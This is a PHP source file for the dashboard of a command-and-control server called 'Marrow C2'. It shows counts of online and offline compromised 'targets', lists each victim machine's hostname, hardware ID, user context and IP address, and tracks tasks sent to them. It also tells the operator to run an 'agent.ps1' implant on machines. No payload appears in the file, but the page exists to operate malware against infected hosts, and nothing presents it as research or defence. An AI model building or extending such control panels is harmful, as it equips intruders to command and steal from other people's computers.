<?php
// Marrow C2 - Dashboard
error_reporting(E_ALL);
ini_set('display_errors', 1);

require_once __DIR__ . '/includes/auth.php';
requireAuth(); // Require login

require_once __DIR__ . '/includes/Layout.php';
require_once __DIR__ . '/includes/Target.php';
require_once __DIR__ . '/includes/Task.php';

$targetModel = new Target();
$taskModel = new Task();
$stats = $targetModel->getStats();
$targets = $targetModel->getAll();
$recentTasks = $taskModel->getRecent(15);

Layout::header('Dashboard');
?>

<div class="max-w-7xl mx-auto space-y-6">
    <!-- Stats -->
    <div class="grid grid-cols-4 gap-5">
        <div class="bg-dark-700 border border-dark-500 rounded-2xl p-6 hover:glow-green transition-all">
            <div class="flex items-center justify-between mb-3">
                <span class="text-sm text-gray-400">Total Targets</span>
                <span class="text-2xl">🎯</span>
            </div>
            <div class="text-4xl font-bold text-white"><?= $stats['total'] ?></div>
        </div>
        <div class="bg-gradient-to-br from-accent/10 to-accent/5 border border-accent/30 rounded-2xl p-6 glow-green">
            <div class="flex items-center justify-between mb-3">
                <span class="text-sm text-accent/70">Active Now</span>
                <span class="text-2xl">⚡</span>
            </div>
            <div class="text-4xl font-bold text-accent"><?= $stats['online'] ?></div>
        </div>
        <div class="bg-dark-700 border border-dark-500 rounded-2xl p-6">
            <div class="flex items-center justify-between mb-3">
                <span class="text-sm text-gray-400">Offline</span>
                <span class="text-2xl">💤</span>
            </div>
            <div class="text-4xl font-bold text-gray-500"><?= $stats['offline'] ?></div>
        </div>
        <div class="bg-gradient-to-br from-warning/10 to-warning/5 border border-warning/30 rounded-2xl p-6">
            <div class="flex items-center justify-between mb-3">
                <span class="text-sm text-warning/70">Pending Tasks</span>
                <span class="text-2xl">📋</span>
            </div>
            <div class="text-4xl font-bold text-warning"><?= $stats['pending'] ?></div>
        </div>
    </div>

    <div class="grid grid-cols-3 gap-6">
        <!-- Targets Grid -->
        <div class="col-span-2 space-y-4">
            <div class="flex items-center justify-between">
                <h2 class="text-lg font-semibold text-white">Active Targets</h2>
                <a href="/pages/targets.php" class="text-sm text-primary hover:text-primary/80">View All →</a>
            </div>
            <div class="grid grid-cols-2 gap-4">
                <?php foreach (array_slice($targets, 0, 6) as $t):
                    $online = $t['is_online'];
                    $name = $t['nickname'] ?: $t['hostname'] ?: $t['hwid'];
                    ?>
                    <a href="/pages/target.php?id=<?= urlencode($t['hwid']) ?>"
                        class="group bg-dark-700 border border-dark-500 rounded-2xl p-5 hover:border-primary/50 transition-all hover:shadow-lg hover:shadow-primary/5">
                        <div class="flex items-center justify-between mb-3">
                            <div class="flex items-center gap-3">
                                <div
                                    class="w-10 h-10 rounded-xl bg-gradient-to-br <?= $online ? 'from-accent/20 to-primary/20' : 'from-dark-500 to-dark-600' ?> flex items-center justify-center text-xl">
                                    💻</div>
                                <div>
                                    <div class="text-white font-medium group-hover:text-primary transition-colors">
                                        <?= htmlspecialchars($name) ?>
                                    </div>
                                    <div class="text-xs text-gray-500"><?= htmlspecialchars($t['user_context'] ?? '-') ?>
                                    </div>
                                </div>
                            </div>
                            <div class="flex items-center gap-1.5">
                                <div
                                    class="w-2 h-2 rounded-full <?= $online ? 'bg-accent animate-pulse' : 'bg-gray-600' ?>">
                                </div>
                            </div>
                        </div>
                        <div class="flex items-center gap-4 text-xs text-gray-500">
                            <span>📍 <?= htmlspecialchars($t['ip_address'] ?? '-') ?></span>
                            <span>🕐 <?= $t['seconds_ago'] ?>s</span>
                        </div>
                    </a>
                <?php endforeach; ?>
                <?php if (empty($targets)): ?>
                    <div class="col-span-2 bg-dark-700 border border-dark-500 rounded-2xl p-12 text-center text-gray-500">
                        No targets yet. Run agent.ps1 on a machine.
                    </div>
                <?php endif; ?>
            </div>
        </div>

        <!-- Activity Feed -->
        <div class="space-y-4">
            <h2 class="text-lg font-semibold text-white">Recent Activity</h2>
            <div
                class="bg-dark-700 border border-dark-500 rounded-2xl divide-y divide-dark-500 max-h-[500px] overflow-auto">
                <?php foreach ($recentTasks as $t): ?>
                    <div class="p-4 hover:bg-dark-600 transition-colors">
                        <div class="flex items-center justify-between mb-1">
                            <span class="text-sm font-medium text-primary"><?= htmlspecialchars($t['module_name']) ?></span>
                            <span
                                class="text-xs px-2 py-0.5 rounded-full <?= $t['status'] === 'completed' ? 'bg-accent/20 text-accent' : 'bg-warning/20 text-warning' ?>"><?= $t['status'] ?></span>
                        </div>
                        <div class="text-xs text-gray-500"><?= htmlspecialchars($t['hostname'] ?? 'Unknown target') ?></div>
                    </div>
                <?php endforeach; ?>
                <?php if (empty($recentTasks)): ?>
                    <div class="p-8 text-center text-gray-500">No activity yet</div>
                <?php endif; ?>
            </div>

            <!-- Mini Chart -->
            <div class="bg-dark-700 border border-dark-500 rounded-2xl p-4">
                <h3 class="text-sm font-medium text-gray-400 mb-3">Activity Pulse</h3>
                <div class="h-24"><canvas id="chart"></canvas></div>
            </div>
        </div>
    </div>
</div>

<script>
    const ctx = document.getElementById('chart').getContext('2d');
    const chart = new Chart(ctx, {
        type: 'line',
        data: {
            labels: Array(20).fill(''),
            datasets: [{
                data: Array(20).fill(<?= $stats['online'] ?>),
                borderColor: '#10b981',
                backgroundColor: 'rgba(16,185,129,0.1)',
                fill: true,
                tension: 0.4,
                pointRadius: 0
            }]
        },
        options: {
            responsive: true,
            maintainAspectRatio: false,
            plugins: { legend: { display: false } },
            scales: { x: { display: false }, y: { display: false, min: 0 } }
        }
    });

    setInterval(async () => {
        const s = await fetch('/api/dashboard.php?action=stats').then(r => r.json());
        chart.data.datasets[0].data.shift();
        chart.data.datasets[0].data.push(s.online);
        chart.update('none');
    }, 2000);
</script>

<?php Layout::footer(); ?>